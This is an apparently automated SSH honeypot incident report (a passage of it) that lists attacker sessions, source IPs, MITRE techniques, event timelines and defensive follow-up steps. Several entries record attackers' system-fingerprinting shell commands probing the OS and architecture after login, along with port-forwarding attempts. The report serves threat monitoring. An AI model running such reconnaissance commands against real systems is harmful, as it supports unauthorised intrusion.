- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0fb712690b9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 04:56 |
| **Last Seen** | 2026-07-17 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:56:25` | `cowrie.session.connect` |
| `2026-07-17 04:56:25` | `cowrie.client.version` |
| `2026-07-17 04:56:26` | `cowrie.client.kex` |
| `2026-07-17 04:56:26` | `cowrie.login.success` |
| `2026-07-17 04:56:26` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:56:26` | `cowrie.direct-tcpip.data` |
| `2026-07-17 04:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e998cc0ef01b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:56 |
| **Last Seen** | 2026-07-17 04:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:56:54` | `cowrie.session.connect` |
| `2026-07-17 04:56:55` | `cowrie.client.version` |
| `2026-07-17 04:56:55` | `cowrie.client.kex` |
| `2026-07-17 04:56:56` | `cowrie.login.success` |
| `2026-07-17 04:56:57` | `cowrie.session.params` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.success` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:57` | `cowrie.command.input` |
| `2026-07-17 04:56:58` | `cowrie.log.closed` |
| `2026-07-17 04:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0023b61e3bab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:58 |
| **Last Seen** | 2026-07-17 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:58:24` | `cowrie.session.connect` |
| `2026-07-17 04:58:25` | `cowrie.client.version` |
| `2026-07-17 04:58:25` | `cowrie.client.kex` |
| `2026-07-17 04:58:26` | `cowrie.login.success` |
| `2026-07-17 04:58:27` | `cowrie.session.params` |
| `2026-07-17 04:58:27` | `cowrie.command.input` |
| `2026-07-17 04:58:27` | `cowrie.command.input` |
| `2026-07-17 04:58:27` | `cowrie.command.input` |
| `2026-07-17 04:58:27` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.command.success` |
| `2026-07-17 04:58:28` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.command.input` |
| `2026-07-17 04:58:28` | `cowrie.log.closed` |
| `2026-07-17 04:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c542eda091a8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:59 |
| **Last Seen** | 2026-07-17 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:59:53` | `cowrie.session.connect` |
| `2026-07-17 04:59:53` | `cowrie.client.version` |
| `2026-07-17 04:59:53` | `cowrie.client.kex` |
| `2026-07-17 04:59:55` | `cowrie.login.success` |
| `2026-07-17 04:59:56` | `cowrie.session.params` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.success` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:56` | `cowrie.command.input` |
| `2026-07-17 04:59:57` | `cowrie.log.closed` |
| `2026-07-17 04:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d66b382b73

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:01 |
| **Last Seen** | 2026-07-17 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:01:22` | `cowrie.session.connect` |
| `2026-07-17 05:01:22` | `cowrie.client.version` |
| `2026-07-17 05:01:22` | `cowrie.client.kex` |
| `2026-07-17 05:01:24` | `cowrie.login.success` |
| `2026-07-17 05:01:26` | `cowrie.session.params` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.success` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.command.input` |
| `2026-07-17 05:01:26` | `cowrie.log.closed` |
| `2026-07-17 05:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2805364a3190

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:02 |
| **Last Seen** | 2026-07-17 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:02:50` | `cowrie.session.connect` |
| `2026-07-17 05:02:50` | `cowrie.client.version` |
| `2026-07-17 05:02:50` | `cowrie.client.kex` |
| `2026-07-17 05:02:52` | `cowrie.login.success` |
| `2026-07-17 05:02:54` | `cowrie.session.params` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.success` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.command.input` |
| `2026-07-17 05:02:54` | `cowrie.log.closed` |
| `2026-07-17 05:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39b3facd4be

| Field | Detail |
|---|---|
| **Source IP** | `223.166.28[.]162` |
| **First Seen** | 2026-07-17 05:04 |
| **Last Seen** | 2026-07-17 05:09 |
| **Session Duration** | 341s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:04:17` | `cowrie.session.connect` |
| `2026-07-17 05:04:43` | `cowrie.client.version` |
| `2026-07-17 05:04:43` | `cowrie.client.kex` |
| `2026-07-17 05:04:59` | `cowrie.login.success` |
| `2026-07-17 05:05:05` | `cowrie.session.params` |
| `2026-07-17 05:05:05` | `cowrie.command.input` |
| `2026-07-17 05:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.166.28[.]162` to AbuseIPDB if not already reported
- [ ] Block `223.166.28[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cc515a98d7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:04 |
| **Last Seen** | 2026-07-17 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:04:20` | `cowrie.session.connect` |
| `2026-07-17 05:04:20` | `cowrie.client.version` |
| `2026-07-17 05:04:20` | `cowrie.client.kex` |
| `2026-07-17 05:04:22` | `cowrie.login.success` |
| `2026-07-17 05:04:24` | `cowrie.session.params` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.success` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.command.input` |
| `2026-07-17 05:04:24` | `cowrie.log.closed` |
| `2026-07-17 05:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c3393958c2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-17 05:04 |
| **Last Seen** | 2026-07-17 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:04:25` | `cowrie.session.connect` |
| `2026-07-17 05:04:25` | `cowrie.client.version` |
| `2026-07-17 05:04:25` | `cowrie.client.kex` |
| `2026-07-17 05:04:26` | `cowrie.login.success` |
| `2026-07-17 05:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be161d29cdaa

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-17 05:04 |
| **Last Seen** | 2026-07-17 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:04:25` | `cowrie.session.connect` |
| `2026-07-17 05:04:25` | `cowrie.client.version` |
| `2026-07-17 05:04:25` | `cowrie.client.kex` |
| `2026-07-17 05:04:26` | `cowrie.login.success` |
| `2026-07-17 05:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4208404ce9d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:05 |
| **Last Seen** | 2026-07-17 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:05:52` | `cowrie.session.connect` |
| `2026-07-17 05:05:52` | `cowrie.client.version` |
| `2026-07-17 05:05:52` | `cowrie.client.kex` |
| `2026-07-17 05:05:54` | `cowrie.login.success` |
| `2026-07-17 05:05:56` | `cowrie.session.params` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.success` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.command.input` |
| `2026-07-17 05:05:56` | `cowrie.log.closed` |
| `2026-07-17 05:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1c541b5f96

| Field | Detail |
|---|---|
| **Source IP** | `35.205.107[.]195` |
| **First Seen** | 2026-07-17 05:06 |
| **Last Seen** | 2026-07-17 05:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:06:48` | `cowrie.session.connect` |
| `2026-07-17 05:06:48` | `cowrie.client.version` |
| `2026-07-17 05:06:48` | `cowrie.client.kex` |
| `2026-07-17 05:06:50` | `cowrie.login.success` |
| `2026-07-17 05:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.107[.]195` to AbuseIPDB if not already reported
- [ ] Block `35.205.107[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418001975e16

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:07 |
| **Last Seen** | 2026-07-17 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:07:23` | `cowrie.session.connect` |
| `2026-07-17 05:07:23` | `cowrie.client.version` |
| `2026-07-17 05:07:23` | `cowrie.client.kex` |
| `2026-07-17 05:07:25` | `cowrie.login.success` |
| `2026-07-17 05:07:27` | `cowrie.session.params` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.success` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.command.input` |
| `2026-07-17 05:07:27` | `cowrie.log.closed` |
| `2026-07-17 05:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-109aea63d234

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:08 |
| **Last Seen** | 2026-07-17 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:08:52` | `cowrie.session.connect` |
| `2026-07-17 05:08:52` | `cowrie.client.version` |
| `2026-07-17 05:08:52` | `cowrie.client.kex` |
| `2026-07-17 05:08:54` | `cowrie.login.success` |
| `2026-07-17 05:08:55` | `cowrie.session.params` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.success` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.command.input` |
| `2026-07-17 05:08:55` | `cowrie.log.closed` |
| `2026-07-17 05:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a68932e2f30

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 05:09 |
| **Last Seen** | 2026-07-17 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:09:33` | `cowrie.session.connect` |
| `2026-07-17 05:09:33` | `cowrie.client.version` |
| `2026-07-17 05:09:33` | `cowrie.client.kex` |
| `2026-07-17 05:09:34` | `cowrie.login.success` |
| `2026-07-17 05:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501991ce11ef

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 05:09 |
| **Last Seen** | 2026-07-17 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:09:33` | `cowrie.session.connect` |
| `2026-07-17 05:09:33` | `cowrie.client.version` |
| `2026-07-17 05:09:34` | `cowrie.client.kex` |
| `2026-07-17 05:09:34` | `cowrie.login.success` |
| `2026-07-17 05:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28426bcfb8e2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 05:09 |
| **Last Seen** | 2026-07-17 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:09:37` | `cowrie.session.connect` |
| `2026-07-17 05:09:37` | `cowrie.client.version` |
| `2026-07-17 05:09:37` | `cowrie.client.kex` |
